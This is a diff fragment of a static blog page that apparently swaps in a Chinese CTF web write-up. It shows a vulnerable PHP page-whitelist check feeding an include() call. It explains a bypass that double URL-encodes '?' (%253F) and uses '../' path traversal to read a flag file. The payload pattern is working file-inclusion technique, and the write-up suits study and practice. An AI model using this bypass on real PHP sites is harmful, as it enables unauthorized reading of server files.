class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>进入hint.php，告诉我们flag在ffffllllaaaagggg中</p>
+<p>审计代码，发现需要让其访问到flag的所在文件，我们需要构造这样的payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=(source.php or hint.php)(url二次编码的&apos;?&apos; =&gt; %253F)(flag文件的位置)</span><br></pre></td></tr></table></figure>
+
+<p>url二次编码：在接收请求时，会自动进行一次url解码，php代码中又内置了一行手动解码，因此通过需要二次编码。</p>
+<p>关于flag文件的位置：私认为题出的不好，flag文件于<code>../../../../../ffffllllaaaagggg</code>，且只提示了文件名，没有路径，需要自己暴力../去找。</p>
 
     
 
@@ -398,7 +316,7 @@ int main()
         </li>
         <li>
           <strong>本文链接：</strong>
-          <a href="https://v25bh145.github.io/2020/03/02/questions/Question-P2536/" title="Question-P2536" target="_blank">https://v25bh145.github.io/2020/03/02/questions/Question-P2536/</a>
+          <a href="https://v25bh145.github.io/2020/10/01/ctf/ctf笔记-03/" title="CTF笔记-WEB攻防-02" target="_blank">https://v25bh145.github.io/2020/10/01/ctf/ctf笔记-03/</a>
         </li>
         
         <li>
@@ -420,11 +338,11 @@ int main()
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color4">Question</a>
+        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color3">ctf-web</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color3">暴力</a>
+        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color2">CTF笔记-WEB攻防</a>
         		</li>
       		
 		</ul>
@@ -443,18 +361,18 @@ int main()
 
 <nav id="article-nav">
   
-    <a href="/2020/09/29/nodeJs/5.%20CLI%E4%BB%A5%E5%8F%8AFS%20API%20%E7%AC%AC%E4%B8%80%E4%B8%AAnode.js%E7%A8%8B%E5%BA%8F%20-%20%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%A8%8B%E5%BA%8F/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2020/10/01/ctf/ctf%E7%AC%94%E8%AE%B0-04/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          5.CLI以及FS API
+          CTF笔记-WEB攻防-02
         
       </div>
     </a>
   
   
-    <a href="/2020/02/27/questions/Question-P2292/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Question-P2292</div>
+    <a href="/2020/09/29/nodeJs/12.%20redis/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">12.Redis</div>
       <i class="icon-circle-right"></i>
     </a>
   
